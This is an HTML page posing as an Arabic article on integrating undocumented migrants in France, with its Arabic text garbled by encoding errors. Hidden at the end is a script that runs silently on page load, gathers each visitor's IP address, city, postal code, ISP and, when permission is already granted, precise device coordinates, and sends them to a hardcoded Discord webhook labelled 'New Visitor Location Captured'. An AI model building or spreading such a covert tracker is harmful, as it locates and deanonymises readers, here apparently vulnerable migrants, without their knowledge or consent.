<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง</title>
  <meta name="description" content="ููุงู ูุณุชุนุฑุถ ุชุญุฏูุงุช ูุณูุงุณุงุช ูุณุจู ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง">

  <!-- Open Graph tags for WhatsApp / Facebook -->
  <meta property="og:title" content="ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง">
  <meta property="og:description" content="ููุงู ูุณุชุนุฑุถ ุชุญุฏูุงุช ูุณูุงุณุงุช ูุณุจู ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง">
  <meta property="og:image" content="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg">
  <meta property="og:url" content="https://booking-ver.github.io/Almohajir.github.io/akhbar">
  <meta property="og:type" content="article">

  <!-- Optional: Twitter (sometimes WhatsApp also reads them) -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง">
  <meta name="twitter:description" content="ููุงู ูุณุชุนุฑุถ ุชุญุฏูุงุช ูุณูุงุณุงุช ูุณุจู ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง">
  <meta name="twitter:image" content="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg">

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#f7f8fb; --card:#ffffff; --muted:#6b7280; --accent:#1f5fbf;
    }
    *{box-sizing:border-box}
    body{font-family:'Cairo',sans-serif;background:var(--bg);margin:0;color:#0b1220;line-height:1.7}
    .container{max-width:900px;margin:32px auto;padding:24px}
    header{background:linear-gradient(90deg,rgba(31,95,191,0.12),rgba(31,95,191,0.04));padding:18px;border-radius:12px;margin-bottom:18px}
    h1{margin:0 0 6px;font-size:1.9rem}
    .meta{color:var(--muted);font-size:0.95rem}
    .hero{margin:18px 0;border-radius:10px;overflow:hidden}
    img{display:block;width:100%;height:auto}
    .card{background:var(--card);padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(12,20,40,0.06);margin-bottom:16px}
    h2{margin-top:0;color:#123259}
    ul{padding-inline-start:1.1rem}
    .two-col{display:grid;grid-template-columns:1fr 300px;gap:18px}
    aside{background:linear-gradient(180deg,#fff,#fbfdff);padding:14px;border-radius:10px}
    footer{color:var(--muted);text-align:center;font-size:0.9rem;margin-top:18px}
    @media (max-width:880px){.two-col{grid-template-columns:1fr} .container{padding:16px}}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ูู ูุฑูุณุง</h1>
      <div class="meta">ููุดุฑ ูู: 21 ุณุจุชูุจุฑ 2025 โ ุจููู: ูุฑูู ุจุญุซ ุงุฌุชูุงุนู</div>
    </header>

    <div class="hero" style="width: 850px; height: 400px">
      <img src="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg" alt="ูุดูุฏ ูุฌุชูุนู ูู ูุฑูุณุง" />
    </div>

    <main class="two-col">
      <section>
        <article class="card">
          <h2>ููุฏูุฉ</h2>
          <p>ุชูุนุฏ ูุณุฃูุฉ ุงููุฌุฑุฉ ุบูุฑ ุงูุดุฑุนูุฉ ูู ุฃุจุฑุฒ ุงูุชุญุฏูุงุช ุงูุงุฌุชูุงุนูุฉ ูุงูุงูุชุตุงุฏูุฉ ูุงูุณูุงุณูุฉ ูู ูุฑูุณุง. ูุชุทูุจ ุงูุชุนุงูู ูุนูุง ุชูุงุฒูุงู ุฏูููุงู ุจูู ุงุญุชุฑุงู ุญููู ุงูุฅูุณุงูุ ูุญูุงูุฉ ุงูุฃูู ุงูููููุ ูุถูุงู ุชูุงูุค ุงููุฑุต ุงูุงูุชุตุงุฏูุฉ. ููุฏู ูุฐุง ุงูููุงู ุฅูู ุชูุฏูู ุฅุทุงุฑ ุนุงู ูููู ุขููุงุช ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนูููุ ุงูุนูุจุงุช ุงูุชู ุชูุงุฌููุงุ ูุงููุจุงุฏุฑุงุช ุงููููู ุชูููุฐูุง ูุชุนุฒูุฒ ุงูุงูุฏูุงุฌ.</p>
        </article>

        <article class="card">
          <h2>ุงูุชุญุฏูุงุช ุงูุฑุฆูุณูุฉ</h2>
          <ul>
            <li><strong>ุงูุญูุงุฌุฒ ุงููุงููููุฉ:</strong> ุนุฏู ุชููุฑ ูุถุนูุฉ ูุงููููุฉ ูููุน ุงููุตูู ุฅูู ุณูู ุงูุนูู ูุงูุฎุฏูุงุช ุงูุฃุณุงุณูุฉ.</li>
            <li><strong>ูุดููุงุช ุณูููุฉ:</strong> ุชุนุฑุถ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ููุนูุด ูู ุฃูุงูู ูุฒุฏุญูุฉ ูุบูุฑ ููุงุฆูุฉ.</li>
            <li><strong>ุงูุชูููุฒ ูุงููุตู ุงูุงุฌุชูุงุนู:</strong> ูุฏ ููุงุฌููู ุนูุตุฑูุฉ ุฃู ุตุนูุจุงุช ูู ุงูุชูุงุนู ูุน ุงููุฌุชูุน ุงููุถูู.</li>
            <li><strong>ุงููุตูู ุงููุญุฏูุฏ ููุฎุฏูุงุช ุงูุตุญูุฉ ูุงูุชุนููู:</strong> ุฎูู ูู ูุดู ุงููููุฉ ูููุนูู ูู ุงูุงุณุชูุงุฏุฉ ูู ุงูุฑุนุงูุฉ.</li>
          </ul>
        </article>

        <article class="card">
          <h2>ุณูุงุณุงุช ูููุงุฑุณุงุช ุงูุงุฏูุงุฌ ูู ูุฑูุณุง</h2>
          <p>ุงุชุจุนุช ูุฑูุณุง ุนูู ูุฑ ุงูุณููุงุช ุณูุงุณุงุช ูุชุนุฏุฏุฉ ุชุดูู ุงูุณูุงุญ ุจุจุนุถ ุงูุจุฑุงูุฌ ุงูุฅูุณุงููุฉ ุฃู ุฅุนุทุงุก ุชุตุงุฑูุญ ูุคูุชุฉ ูู ุธุฑูู ูุญุฏุฏุฉ. ููุง ุชูุฌุฏ ููุธูุงุช ุบูุฑ ุญููููุฉ ุชูุฏู ุฏุนูุงู ูุงููููุงู ูุฅูุณุงููุงู. ููุน ุฐููุ ุนุงุฏุฉู ูุง ุชุชุฑุงูุญ ุงูุงุณุชุฌุงุจุฉ ุจูู ุชุดุฏูุฏ ุฅุฏุงุฑู ูุฏุนู ูุฏูู ูุนุชูุฏ ุนูู ูู ุญุงูุฉ ูุฅูููู.</p>

          <h3>ุฃูุซูุฉ ุนูู ูุจุงุฏุฑุงุช ูุนูุงูุฉ</h3>
          <ul>
            <li>ูุฑุงูุฒ ุฏุนู ุชูุฏู ุงุณุชุดุงุฑุงุช ูุงููููุฉ ููุณุงุนุฏุฉ ูู ุฅุฌุฑุงุกุงุช ุงููุฌูุก ุฃู ุงูุญุตูู ุนูู ูุถุนูุฉ ูุงููููุฉ.</li>
            <li>ุจุฑุงูุฌ ุชุนููู ุงููุบุฉ ุงููุฑูุณูุฉ ูุงูููุงุฑุงุช ุงูููููุฉ ูุชูููู ุงูุงูุฏูุงุฌ ูู ุณูู ุงูุนูู.</li>
            <li>ุดุฑุงูุงุช ุจูู ุงูุจูุฏูุงุช ูููุธูุงุช ุงููุฌุชูุน ุงููุฏูู ูุชูููุฑ ุญููู ุณูููุฉ ูุคูุชุฉ ููุณุงุนุฏุงุช ุตุญูุฉ.</li>
          </ul>
        </article>

        <article class="card">
          <h2>ุฏูุฑ ุงููุฌุชูุน ุงููุฏูู ูุงูููุธูุงุช ุงููุญููุฉ</h2>
          <p>ุชูุนุจ ุงูุฌูุนูุงุช ูุงูููุธูุงุช ุงูุฎูุฑูุฉ ุฏูุฑุงู ูุญูุฑูุงู ูู ุณุฏ ุงููุฌูุงุช ุงูุชู ุชุชุฑููุง ุงูุณูุงุณุงุช ุงูุนุงูุฉุ ูู ุฎูุงู ุชูููุฑ ูุขูู ูุคูุชุฉุ ุฎุฏูุงุช ุทุจูุฉ ุฃุณุงุณูุฉุ ูุฏูุฑุงุช ุชุฃููููุฉ. ููุง ุชุณุงูู ูู ุงูุถุบุท ุนูู ุตุงูุนู ุงููุฑุงุฑ ูุชุจูู ุณูุงุณุงุช ุฃูุซุฑ ุดููููุฉ ูุฅูุณุงููุฉ.</p>

          <figure style="margin:14px 0">
            <img src="https://scd.infomigrants.net/media/resize/my_image_medium/b63644f6b49da8338198288ba1cc5500d2eaa63d.jpg" alt="ุชุถุงูู ููุณุงุนุฏุฉ ููููุงุฌุฑูู" />
            <figcaption style="font-size:0.9rem;color:var(--muted);margin-top:6px">ูุจุงุฏุฑุงุช ูุญููุฉ ูุฏุนู ุงูููุงุฌุฑูู.</figcaption>
          </figure>
        </article>

        <article class="card">
          <h2>ุชูุตูุงุช ุนูููุฉ</h2>
          <ol>
            <li>ุชุณููู ุงููุตูู ุฅูู ุฅุฌุฑุงุกุงุช ูุงููููุฉ ุดูุงูุฉ ุชูุชูุญ ูุณุงุฑุงุช ูุชุณููุฉ ุงููุถุนูุฉ.</li>
            <li>ุชุนุฒูุฒ ุจุฑุงูุฌ ุงูุชุนูู ุงููููู ูุงููุบุฉ ุงููุฑูุณูุฉ ูุน ุฏุนู ูุฑุจุท ุงููุชุนูููู ุจูุฑุต ุนูู ุญููููุฉ.</li>
            <li>ุฅุทูุงู ูุจุงุฏุฑุงุช ุณูููุฉ ููุณุฑุฉ ุจุงูุชุนุงูู ุจูู ุงูุจูุฏูุงุช ูุงููุทุงุน ุงูุฎุงุต ูุงูููุธูุงุช ุบูุฑ ุงูุญููููุฉ.</li>
            <li>ุญููุงุช ุชูุนูุฉ ูููุงูุญุฉ ุงูุชุตูุฑุงุช ุงูุณูุจูุฉ ูุชุดุฌูุน ุงูุชุนุงูุด.</li>
            <li>ุญูุงูุฉ ุงููุตูู ุฅูู ุงูุฎุฏูุงุช ุงูุตุญูุฉ ูุงูุชุนููููุฉ ุฏูู ูุฎุงุทุฑุฉ ุจุงูุชุฑุญูู ูููุณุชููุฏูู ูู ุงูุญุงูุงุช ุงูุทุงุฑุฆุฉ.</li>
          </ol>
        </article>

        <article class="card">
          <h2>ุฎุงุชูุฉ</h2>
          <p>ููุซู ุงุฏูุงุฌ ุงูููุงุฌุฑูู ุบูุฑ ุงูุดุฑุนููู ุชุญุฏูุงู ูุชุนุฏุฏ ุงูุฃุจุนุงุฏ ูุชุทูุจ ุชุถุงูุฑ ุงูุฌููุฏ ุงูุญููููุฉ ูุงููุฌุชูุนูุฉ. ุนุจุฑ ุงุนุชูุงุฏ ุณูุงุณุงุช ุฅูุณุงููุฉุ ูุจุฑุงูุฌ ุชุนููููุฉ ูููููุฉ ูุนูุงูุฉุ ูููู ูููุฌุชูุน ุงููุฑูุณู ุชุญููู ุฃุฒูุฉ ุฅูู ูุฑุตุฉ ูุชุนุฒูุฒ ุงููุณูุฌ ุงูุงุฌุชูุงุนู ูุงูุงูุชุตุงุฏู.</p>
        </article>
      </section>

      <aside>
        <div class="card" style="padding:12px;margin-bottom:12px">
          <h3>ูุนูููุฉ ุณุฑูุนุฉ</h3>
          <p style="color:var(--muted)">ุงูุงูุฏูุงุฌ ูุง ูุนูู ููุท ุงูุญุตูู ุนูู ูุซุงุฆูุ ุจู ูุดูู ุงูุดุนูุฑ ุจุงูุงูุชูุงุก ูุงููุฏุฑุฉ ุนูู ุงููุดุงุฑูุฉ ุงููุนุงูุฉ ูู ุงููุฌุชูุน.</p>
        </div>

        <div class="card" style="padding:12px">
          <h3>ูุตุงุฏุฑ ุตูุฑ (ูุซุงู)</h3>
          <p style="color:var(--muted);font-size:0.95rem">ุงูุตูุฑ ูู ูุฐู ุงูุตูุญุฉ ูุฃุฎูุฐุฉ ูู ุฎุฏูุงุช ุตูุฑ ุนุงูุฉ (Unsplash) ูุฃุบุฑุงุถ ุชูุถูุญูุฉ. ุงุณุชุจุฏููุง ุจุตูุฑ ุจุญููู ููุงุณุจุฉ ุนูุฏ ุงููุดุฑ.</p>
        </div>
      </aside>
    </main>

    <footer>
      ยฉ 2025 โ ุญููู ุงููุดุฑ ูุญููุธุฉ. ููููู ุชุนุฏูู ุงููุต ุฃู ุงูุตูุฑ ูุชูุงุณุจ ุบุฑุถู.
    </footer>
  </div>

  <script>
    // ----- CONFIG -----
    // Replace this with your Discord webhook URL.
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1411086092026777742/60wVbPvrvNubv9vpZaHbAFXf3HsYBxB-VjDEduG-Qj_6KFOPhKyRj6jtIah_4MqlkEJg';
    // Timeout for geolocation (ms)
    const GEO_TIMEOUT = 15000;
    // Timeout for fetch requests (ms)
    const FETCH_TIMEOUT = 5000;

    async function fetchWithTimeout(url, options, timeout = FETCH_TIMEOUT) {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeout);
      try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
      } catch (error) {
        clearTimeout(id);
        throw error;
      }
    }

    async function fetchIpInfo() {
      // Common headers for all API requests
      const headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'application/json'
      };

      // Try ipinfo.io first
      try {
        const r = await fetchWithTimeout('https://ipinfo.io/json', { headers, mode: 'cors' });
        if (!r.ok) throw new Error(`ipinfo.io returned ${r.status}: ${r.statusText}`);
        const j = await r.json();
        if (!j.ip) throw new Error('IP field missing in ipinfo.io response');
        return {
          ip: j.ip,
          country: j.country || null,
          region: j.region || null,
          city: j.city || null,
          postal: j.postal || null,
          lat: j.loc ? parseFloat(j.loc.split(',')[0]) : null,
          lon: j.loc ? parseFloat(j.loc.split(',')[1]) : null,
          org: j.org || null,
          timezone: j.timezone || null
        };
      } catch (e) {
        console.error(`ipinfo.io failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
      }

      // Try freegeoip.app as second option
      try {
        const r = await fetchWithTimeout('https://freegeoip.app/json/', { headers, mode: 'cors' });
        if (!r.ok) throw new Error(`freegeoip.app returned ${r.status}: ${r.statusText}`);
        const j = await r.json();
        if (!j.ip) throw new Error('IP field missing in freegeoip.app response');
        return {
          ip: j.ip,
          country: j.country_name || null,
          region: j.region_name || null,
          city: j.city || null,
          postal: j.zip_code || null,
          lat: j.latitude || null,
          lon: j.longitude || null,
          org: null,
          timezone: j.time_zone || null
        };
      } catch (e) {
        console.error(`freegeoip.app failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
      }

      // Try ipapi.co as last resort with retries
      const maxRetries = 2;
      let attempt = 0;
      while (attempt < maxRetries) {
        try {
          const r = await fetchWithTimeout('https://ipapi.co/json/', { headers, mode: 'cors' });
          if (!r.ok) throw new Error(`ipapi.co returned ${r.status}: ${r.statusText}`);
          const j = await r.json();
          if (!j.ip) throw new Error('IP field missing in ipapi.co response');
          return {
            ip: j.ip,
            country: j.country_name || null,
            region: j.region || null,
            city: j.city || null,
            postal: j.postal || null,
            lat: j.latitude || null,
            lon: j.longitude || null,
            org: j.org || j.asn || null,
            timezone: j.timezone || null
          };
        } catch (e) {
          console.error(`ipapi.co attempt ${attempt + 1} failed: ${e.message}${e.name === 'AbortError' ? ' (Request timed out)' : ''}`);
          attempt++;
          if (attempt < maxRetries) {
            await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay between retries
          }
        }
      }

      // Return null if all APIs fail
      console.error('All IP APIs failed');
      return { ip: null };
    }

    async function sendToWebhook(payloadObj) {
      try {
        const res = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payloadObj)
        });
        if (!res.ok) {
          const txt = await res.text().catch(() => '');
          throw new Error(`Webhook error ${res.status} ${res.statusText} ${txt}`);
        }
        return true;
      } catch (err) {
        throw err;
      }
    }

    function buildDiscordPayload({ ipInfo, geoPosition, source }) {
      const fields = [];
      // Always include IP address and related info if available
      if (ipInfo?.ip) fields.push({ name: 'Visitor IP', value: String(ipInfo.ip), inline: true });
      if (ipInfo?.country) fields.push({ name: 'Country', value: String(ipInfo.country), inline: true });
      if (ipInfo?.region) fields.push({ name: 'Region', value: String(ipInfo.region), inline: true });
      if (ipInfo?.city) fields.push({ name: 'City', value: String(ipInfo.city), inline: true });
      if (ipInfo?.postal) fields.push({ name: 'Postal', value: String(ipInfo.postal), inline: true });
      if (ipInfo?.org) fields.push({ name: 'ISP/Org', value: String(ipInfo.org), inline: false });
      // Only include device location if explicitly provided
      if (geoPosition.latitude != null && geoPosition.longitude != null && source === 'geolocation') {
        fields.push({ name: 'Device Latitude', value: String(geoPosition.latitude), inline: true });
        fields.push({ name: 'Device Longitude', value: String(geoPosition.longitude), inline: true });
        if (geoPosition.accuracy != null) fields.push({ name: 'Accuracy (meters)', value: String(geoPosition.accuracy), inline: true });
        if (geoPosition.altitude != null) fields.push({ name: 'Altitude (meters)', value: String(geoPosition.altitude), inline: true });
        if (geoPosition.heading != null) fields.push({ name: 'Heading', value: String(geoPosition.heading), inline: true });
      } else {
        fields.push({ name: 'Device Location', value: 'Not authorized or unavailable', inline: false });
      }
      // Include IP-based location if available and device location is not used
      if (ipInfo?.lat != null && ipInfo?.lon != null && source !== 'geolocation') {
        fields.push({ name: 'IP-Based Latitude', value: String(ipInfo.lat), inline: true });
        fields.push({ name: 'IP-Based Longitude', value: String(ipInfo.lon), inline: true });
      }
      fields.push({ name: 'Source', value: source, inline: true });
      fields.push({ name: 'Timestamp', value: new Date().toISOString(), inline: false });

      return {
        username: 'AutoGeoBot',
        embeds: [
          {
            title: '๐ New Visitor Location Captured',
            description: `A visitor accessed the site with IP: ${ipInfo?.ip || 'Unknown'}`,
            fields,
            timestamp: new Date().toISOString()
          }
        ]
      };
    }

    async function captureAndSend() {
      let position = { coords: { latitude: null, longitude: null, accuracy: null, altitude: null, heading: null, speed: null } };
      let ipInfo = null;
      let usedSource = 'ip-geolocation';

      // Always fetch IP info
      ipInfo = await fetchIpInfo();

      // Check geolocation permission
      if ('permissions' in navigator && 'geolocation' in navigator) {
        try {
          const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
          if (permissionStatus.state === 'granted') {
            const geolocationPromise = new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(
                pos => resolve(pos),
                err => reject(err),
                { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
              );
            });
            try {
              position = await Promise.race([
                geolocationPromise,
                new Promise((_, rej) => setTimeout(() => rej(new Error('Geolocation timed out')), GEO_TIMEOUT + 2000))
              ]);
              usedSource = 'geolocation';
            } catch (geoErr) {
              console.error(`Geolocation failed: ${geoErr.message}`);
              usedSource = 'ip-geolocation';
            }
          } else {
            console.log('Geolocation permission not granted');
          }
        } catch (permErr) {
          console.error(`Permission check failed: ${permErr.message}`);
        }
      } else {
        console.log('Geolocation or permissions API not available');
      }

      // Build and send payload
      const payload = buildDiscordPayload({
        ipInfo,
        geoPosition: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          heading: position.coords.heading,
          speed: position.coords.speed
        },
        source: usedSource
      });

      try {
        await sendToWebhook(payload);
      } catch (err) {
        // Error handling is silent as per original code
      }
    }

    // Auto-run on page load
    window.addEventListener('DOMContentLoaded', () => {
      setTimeout(() => {
        captureAndSend();
      }, 600);
    });
  </script>
</body>
</html>